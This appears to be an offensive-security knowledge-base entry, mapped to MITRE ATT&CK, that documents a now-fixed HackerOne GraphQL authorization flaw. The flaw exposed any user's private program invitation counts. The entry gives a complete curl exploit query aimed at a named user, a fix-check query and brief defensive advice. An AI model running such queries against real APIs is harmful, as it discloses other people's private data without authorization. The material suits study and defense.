---
id: proc-uuid-1
tags:
  - graphql
  - information-disclosure
  - api
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/graphql-query-user-invitations]]'
  - '[[commands/graphql-verify-fix-invitations]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:35.097Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
  - '[[Exploit Public-Facing Application]]'
---
# Query-User-Private-Invitations-via-GraphQL

## Summary

This procedure exploits an authorization flaw in HackerOne's GraphQL API to query and disclose the total count of private program invitations (soft_launch_invitations) for any arbitrary user, revealing sensitive information about their participation in private bug bounty programs managed via the /invite/token system.

## Description

The HackerOne GraphQL endpoint at /graphql lacks proper access controls on the User type's soft_launch_invitations field, allowing unauthenticated queries to fetch invitation counts across states like pending_terms, open, accepted, cancelled, and rejected. By crafting a query with fragments and variables, an attacker can target a specific username (e.g., 'jobert') and obtain the total_count, which in the example was 27. This discloses the user's involvement in private programs without needing authentication. Post-fix verification shows counts returning 0 due to enforced authorization.

## Requirements

1. Internet access to reach https://hackerone.com/graphql
2. HTTP client capable of POST requests with JSON payloads (e.g., curl)
3. Knowledge of GraphQL query structure and variables for pagination and filtering

## Defense

Defensive measures and detection strategies:

- Implement strict authorization checks in GraphQL resolvers for user-specific fields like soft_launch_invitations
- Rate-limit unauthenticated GraphQL queries to prevent abuse
- Monitor API logs for queries targeting user() with arbitrary usernames and sensitive fields
- Use schema introspection limits to hide internal fields from unauthenticated users

## Objectives

1. Retrieve total_count of private invitations for a target user
2. Confirm exposure of private program involvement
3. Verify fix by observing zeroed counts post-authorization enforcement

## Instructions

### Step 1: Execute Vulnerable Query

**Context**: Craft and send a GraphQL POST request to query the invitation count for a target user across specified states, exploiting the lack of auth checks.

**Command** ([[commands/graphql-query-user-invitations]]):
```bash
curl -X POST https://hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query Directory_invitations_page($state_0:[InvitationStateEnum]!,$state_3:[InvitationStateEnum]!,$first_1:Int!,$size_2:ProfilePictureSizes!) {\n  user(username:\"jobert\") {\n    id,\n    ...F5\n  }\n}\nfragment F0 on User {\n  _soft_launch_invitations259p9N:soft_launch_invitations(state:$state_0,first:$first_1) {\n    total_count\n  },\n  id\n}\nfragment F1 on InvitationsSoftLaunch {\n  id,\n  team {\n    handle,\n    url,\n    name,\n    about,\n    bug_count,\n    base_bounty,\n    offers_bounties,\n    currency,\n    _profile_picture2rz4nb:profile_picture(size:$size_2),\n    id\n  },\n  expires_at,\n  state,\n  token\n}\nfragment F2 on Node {\n  id,\n  __typename\n}\nfragment F3 on InvitationInterface {\n  __typename,\n  ...F1,\n  ...F2\n}\nfragment F4 on User {\n  _soft_launch_invitations1WD3Qk:soft_launch_invitations(state:$state_0,first:$first_1) {\n    total_count,\n    edges {\n      node {\n        id,\n        ...F3\n      },\n      cursor\n    },\n    pageInfo {\n      hasNextPage,\n      hasPreviousPage\n    }\n  },\n  _soft_launch_invitations2FRMOR:soft_launch_invitations(state:$state_3,first:$first_1) {\n    total_count\n  },\n  id\n}\nfragment F5 on User {\n  id,\n  ...F0,\n  ...F4\n}","variables":{"state_0":["pending_terms","open","accepted"],"state_3":["pending_terms","open","accepted","cancelled","rejected"],"first_1":100,"size_2":"large"}}'
```

> This command sends a complex GraphQL query with fragments (F0-F5) to alias and fetch total_count from soft_launch_invitations. Variables filter states and set pagination (first:100, size:large). Expected output includes total_count:27, confirming disclosure.

### Step 2: Verify Fix with Authorized Query

**Context**: After remediation, re-run a simplified query to confirm that authorization now blocks access, returning 0 or null for non-owned users.

**Command** ([[commands/graphql-verify-fix-invitations]]):
```bash
curl -X POST https://hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(username: \"jobert\") { soft_launch_invitations(first:100, state:open) { total_count } } }"}'
```

> This simplified query targets open invitations for the same user. Post-fix, expected output is {"data":{"user":{"soft_launch_invitations":{"total_count":0}}}}, indicating successful authorization enforcement.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/graphql-query-user-invitations]]
- [[commands/graphql-verify-fix-invitations]]

## Tools Used


## Tags

- graphql
- information-disclosure
- api
- bug-bounty
